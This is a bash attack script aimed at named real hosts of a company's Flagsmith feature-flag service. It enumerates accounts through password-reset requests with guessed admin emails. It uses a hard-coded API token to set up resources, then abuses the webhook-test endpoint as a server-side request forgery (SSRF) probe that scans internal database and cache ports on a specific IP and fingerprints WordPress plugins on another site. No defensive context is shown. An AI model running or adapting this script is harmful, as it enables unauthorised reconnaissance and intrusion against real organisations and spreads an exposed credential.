#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Try Flagsmith password reset for common admin emails 
echo "=== PASSWORD RESET ENUMERATION ==="
for email in "admin@koinworks.com" "admin@flagsmith.com" "flagsmith@koinworks.com" "admin@admin.com" "admin@localhost" "test@test.com" "user@example.com" "superadmin@koinworks.com"; do
  resp=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/reset_password/" \
    -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"email\":\"$email\"}" --max-time 10)
  echo "$email: $resp"
done

# Use fresh account for SSRF tests
KEY="87e2431cf1869ab16f10eb96774f0c905f947935"
# Need to setup org/proj/env for this key
OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"su"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"s\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"s\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
}

# SSRF: Check internal services via common ports on SuperOkka IP
echo "=== SUPEROKKA INTERNAL PORTS ==="
for port in 5432 6379 3000 8080 9200 27017; do
  echo -n "34.101.241.194:$port -> "
  SSRF "http://34.101.241.194:${port}/"
  echo ""
done

# SSRF: Check koinp2p wp-content for uploaded plugins/themes
echo "=== KOINP2P PLUGINS ==="
for plugin in "code-snippets" "user-role-editor" "updraftplus" "wordfence" "really-simple-ssl" "shortcodes-ultimate"; do
  echo -n "$plugin -> "
  SSRF "https://koinp2p.com/wp-content/plugins/${plugin}/readme.txt"
  echo ""
done
